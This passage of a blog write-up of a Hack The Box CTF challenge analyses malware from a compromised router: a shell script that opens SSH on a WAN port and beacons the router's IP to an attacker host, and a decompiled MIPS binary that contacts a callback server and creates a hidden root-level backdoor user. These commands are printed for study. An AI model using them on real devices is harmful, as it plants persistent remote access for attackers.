<p>The second command (translated) is <code>curl http://configs.router.htb/dead_reanimated_mNmZTMtNjU3YS00 &gt; /tmp/dead_reanimated</code></p>
<p>I ran both of these commands, and was able to retrieve the two files.</p>
<h2 id="reanimatesh">reanimate.sh</h2>
<p>The <code>reanimate.sh</code> script looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>WAN_IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ip -4 -o addr show pppoe-wan | awk <span style="color:#e6db74">&#39;{print $4}&#39;</span> | cut -d <span style="color:#e6db74">&#34;/&#34;</span> -f 1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>ROUTER_IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ip -4 -o addr show br-lan | awk <span style="color:#e6db74">&#39;{print $4}&#39;</span> | cut -d <span style="color:#e6db74">&#34;/&#34;</span> -f 1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CONFIG<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;config redirect             \n\t              
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest &#39;lan&#39;           \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option target &#39;DNAT&#39;        \n\t 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option name &#39;share&#39;         \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option src &#39;wan&#39;            \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option src_dport &#39;61337&#39;    \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest_port &#39;22&#39;       \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option family &#39;ipv4&#39;        \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	list proto &#39;tcpudp&#39;         \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest_ip &#39;</span><span style="color:#e6db74">${</span>ROUTER_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo -e $CONFIG &gt;&gt; /etc/config/firewall
</span></span><span style="display:flex;"><span>/etc/init.d/firewall restart
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>curl -X POST -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -b <span style="color:#e6db74">&#34;auth_token=SFRCe1owbWIxM3NfaDR2M19pbmY&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;ip&#34;:&#34;&#39;</span><span style="color:#e6db74">${</span>WAN_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;}&#39;</span> http://configs.router.htb/reanimate
</span></span></code></pre></div><p>The code creates a firewall rule that redirects traffic from port 61337 to port 22, allowing SSH access to the router from the WAN. It then sends a POST request to <a href="http://configs.router.htb/reanimate">http://configs.router.htb/reanimate</a>, with the WAN IP address of the router, presumably to notify the attackers that the router is back online.</p>
<p>If we Base64 decode the auth token, we get <code>HTB{Z0mb13s_h4v3_inf</code>, which is the first half of the flag.</p>
<h2 id="dead_reanimated">dead_reanimated</h2>
<p>The <code>dead_reanimated</code> binary is a MIPS32 binary, just like <code>dead-reanimation</code>.  I loaded it into Ghidra, and began analyzing it.  This binary has a main function which Ghidra was able to identify, and it looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pvVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>pFVar4;
</span></span><span style="display:flex;"><span>  __uid_t _Var5;
</span></span><span style="display:flex;"><span>  passwd <span style="color:#f92672">*</span>ppVar6;
</span></span><span style="display:flex;"><span>  undefined4 uVar7;
</span></span><span style="display:flex;"><span>  undefined uStack_169;
</span></span><span style="display:flex;"><span>  undefined4 local_168;
</span></span><span style="display:flex;"><span>  undefined auStack_164 [<span style="color:#ae81ff">252</span>];
</span></span><span style="display:flex;"><span>  undefined auStack_68 [<span style="color:#ae81ff">44</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> acStack_3c [<span style="color:#ae81ff">28</span>];
</span></span><span style="display:flex;"><span>  undefined4 local_20;
</span></span><span style="display:flex;"><span>  undefined4 local_1c;
</span></span><span style="display:flex;"><span>  undefined4 local_18;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_20._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;z&#39;</span>;
</span></span><span style="display:flex;"><span>  local_20._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;o&#39;</span>;
</span></span><span style="display:flex;"><span>  local_20._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;m&#39;</span>;
</span></span><span style="display:flex;"><span>  local_20._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;b&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;_&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;l&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;o&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;d&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(auStack_68,<span style="color:#e6db74">&#34;d2c0ba035fe58753c648066d76fa793bea92ef29&#34;</span>,<span style="color:#ae81ff">0x29</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(acStack_3c,<span style="color:#f92672">&amp;</span>DAT_00400d50,<span style="color:#ae81ff">0x1b</span>);
</span></span><span style="display:flex;"><span>  sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(acStack_3c);
</span></span><span style="display:flex;"><span>  pvVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(sVar1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">init_crypto_lib</span>(auStack_68,acStack_3c,pvVar2);
</span></span><span style="display:flex;"><span>  iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_easy_init</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffe</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x2712</span>,<span style="color:#e6db74">&#34;http://callback.router.htb&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x271f</span>,pvVar2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_perform</span>(iVar3);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_cleanup</span>(iVar3);
</span></span><span style="display:flex;"><span>    pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/proc/sys/kernel/hostname&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>    local_168 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(auStack_164,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xfc</span>);
</span></span><span style="display:flex;"><span>    sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#f92672">&amp;</span>local_168,<span style="color:#ae81ff">0x100</span>,<span style="color:#ae81ff">1</span>,pFVar4);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">&amp;</span>uStack_169)[sVar1] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_168,<span style="color:#e6db74">&#34;HSTERUNI-GW-01&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      _Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((_Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (_Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>(), _Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>        ppVar6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getpwnam</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_20);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ppVar6 <span style="color:#f92672">==</span> (passwd <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">system</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;opkg update &amp;&amp; opkg install shadow-useradd &amp;&amp; useradd -s /bin/ash -g 0 -u 0 -o -M z ombie_lord&#34;</span>
</span></span><span style="display:flex;"><span>                );
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#34;passwd zombie_lord&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(pFVar4,<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,pvVar2,pvVar2);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>        uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> uVar7;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Ghidra does a pretty good job of decompiling this function.  First, the function initializes a crypto library, as seen in these lines:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(auStack_68,<span style="color:#e6db74">&#34;d2c0ba035fe58753c648066d76fa793bea92ef29&#34;</span>,<span style="color:#ae81ff">0x29</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(acStack_3c,<span style="color:#f92672">&amp;</span>DAT_00400d50,<span style="color:#ae81ff">0x1b</span>);
</span></span><span style="display:flex;"><span>sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(acStack_3c);
</span></span><span style="display:flex;"><span>pvVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(sVar1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">init_crypto_lib</span>(auStack_68,acStack_3c,pvVar2);
</span></span></code></pre></div><p>The third argument to the <code>init_crypto_lib</code> library is then used as an argument to <code>cURL</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x2712</span>,<span style="color:#e6db74">&#34;http://callback.router.htb&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x271f</span>,pvVar2);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_perform</span>(iVar3);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_cleanup</span>(iVar3);
</span></span></code></pre></div><p>The code then checks to make sure that the hostname of the router is <!-- raw HTML omitted -->HSTERUNI-GW-01<!-- raw HTML omitted -->, and that the user is root.  It returns -1 if either of these conditions are not met.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/proc/sys/kernel/hostname&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>local_168 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(auStack_164,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xfc</span>);
</span></span><span style="display:flex;"><span>sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#f92672">&amp;</span>local_168,<span style="color:#ae81ff">0x100</span>,<span style="color:#ae81ff">1</span>,pFVar4);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>(<span style="color:#f92672">&amp;</span>uStack_169)[sVar1] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_168,<span style="color:#e6db74">&#34;HSTERUNI-GW-01&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (iVar3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    _Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((_Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (_Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>(), _Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>        ...
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If both of these conditions are met, the code then checks to see if the user <code>zombie_lord</code> exists.  If it does not, it installs the <code>shadow-useradd</code> package, and creates the user.  It sets the password to the same value as the crypto key that was passed to cURL earlier.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ppVar6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getpwnam</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_20);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ppVar6 <span style="color:#f92672">==</span> (passwd <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;opkg update &amp;&amp; opkg install shadow-useradd &amp;&amp; useradd -s /bin/ash -g 0 -u 0 -o -M z ombie_lord&#34;</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#34;passwd zombie_lord&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fprintf</span>(pFVar4,<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,pvVar2,pvVar2);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span></code></pre></div><p>The next thing to do is reverse the crypto library, and figure out what the key is.  The crypto library is fairly simple, and can be seen below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">key_rounds_init</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1,undefined <span style="color:#f92672">*</span>param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#f92672">*</span>puVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar5;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>pbVar6;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar7;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(param_1);
</span></span><span style="display:flex;"><span>  iVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  puVar4 <span style="color:#f92672">=</span> param_2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>puVar4 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)iVar3;
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> iVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    puVar4 <span style="color:#f92672">=</span> param_2 <span style="color:#f92672">+</span> iVar3;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (iVar3 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  iVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  iVar5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    iVar7 <span style="color:#f92672">=</span> iVar3 <span style="color:#f92672">%</span> (<span style="color:#66d9ef">int</span>)sVar2;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">trap</span>(<span style="color:#ae81ff">0x1c00</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    pbVar6 <span style="color:#f92672">=</span> param_2 <span style="color:#f92672">+</span> iVar3;
</span></span><span style="display:flex;"><span>    bVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar6;
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> iVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    iVar5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">int</span>)param_1[iVar7] <span style="color:#f92672">+</span> (uint)bVar1 <span style="color:#f92672">+</span> iVar5) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x100</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>pbVar6 <span style="color:#f92672">=</span> param_2[iVar5];
</span></span><span style="display:flex;"><span>    param_2[iVar5] <span style="color:#f92672">=</span> bVar1;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (iVar3 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">perform_rounds</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_2,<span style="color:#66d9ef">int</span> param_3)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar2;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>pbVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar4;
</span></span><span style="display:flex;"><span>  uint uVar5;
</span></span><span style="display:flex;"><span>  uint uVar6;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(param_2);
</span></span><span style="display:flex;"><span>  uVar6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  uVar5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (sVar4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; sVar4 <span style="color:#f92672">!=</span> sVar2; sVar4 <span style="color:#f92672">=</span> sVar4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    uVar5 <span style="color:#f92672">=</span> uVar5 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    pbVar3 <span style="color:#f92672">=</span> (byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> uVar5);
</span></span><span style="display:flex;"><span>    bVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar3;
</span></span><span style="display:flex;"><span>    uVar6 <span style="color:#f92672">=</span> bVar1 <span style="color:#f92672">+</span> uVar6 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> uVar6);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> uVar6) <span style="color:#f92672">=</span> bVar1;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_3 <span style="color:#f92672">+</span> sVar4) <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> ((uint)bVar1 <span style="color:#f92672">+</span> (uint)<span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)) <span style="color:#f92672">^</span> param_2[sVar4];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We could go through the trouble of reversing this, but if this is a standard crypto algorithm, we should be able to find it and use a pre-existing implementation.</p>
<p>I plugged the Ghidra decompilation directly into ChatGPT and asked it to identify the algorithm.  It returned the following:</p>
<p><img src="./images/7-chatgpt_question.png" alt="ChatGPT Question"></p>
<p><img src="./images/8-chatgpt_response.png" alt="ChatCPT Answer"></p>
<p>Now that we know the encryption algorithm is RC4, we can use a pre-existing implementation to decrypt the data.  I grabbed the key and the data to decrypt from the binary, and plugged them into CyberChef:</p>
<p><img src="./images/9-cyberchef_rc4.png" alt="CyberChef Key Decode"></p>
<p>That got us the second half of the flag!</p>
<h2 id="conclusion">Conclusion</h2>
<p>This was a fun multi-step challenge that required a number of different skills to solve.  I enjoyed the challenge, and I hope you enjoyed the writeup!</p>

		</div>
	</main>

<footer id="site-footer" class="section-inner thin animated fadeIn faster">
	<p>
		&copy; 2025 <a href="https://stolenfootball.github.io/">Jeremy Dunn</a>
		&#183; &#183; Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>
			&#183; Theme <a href="https://github.com/1bl4z3r/hermit-V2" target="_blank" rel="noopener">Hermit-V2</a>
		&#183; <a href="https://stolenfootball.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
   stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss">
   <path d="M4 11a9 9 0 0 1 9 9"></path>
   <path d="M4 4a16 16 0 0 1 16 16"></path>
   <circle cx="5" cy="19" r="1"></circle>
</svg></a></p>

</footer>
<script async src="https://stolenfootball.github.io/js/bundle.min.c7c384e4d29d192bbac6811ae4660bb01767194a5bea56baca77e8260f93ea16.js" integrity="sha256-x8OE5NKdGSu6xoEa5GYLsBdnGUpb6la6ynfoJg+T6hY=" crossorigin="anonymous"></script><script async src="https://stolenfootball.github.io/js/link-share.min.24409a4f6e5537d70ffc55ec8f9192208d718678cb8638585342423020b37f39.js" integrity="sha256-JECaT25VN9cP/FXsj5GSII1xhnjLhjhYU0JCMCCzfzk=" crossorigin="anonymous"></script>
</body>

</html>
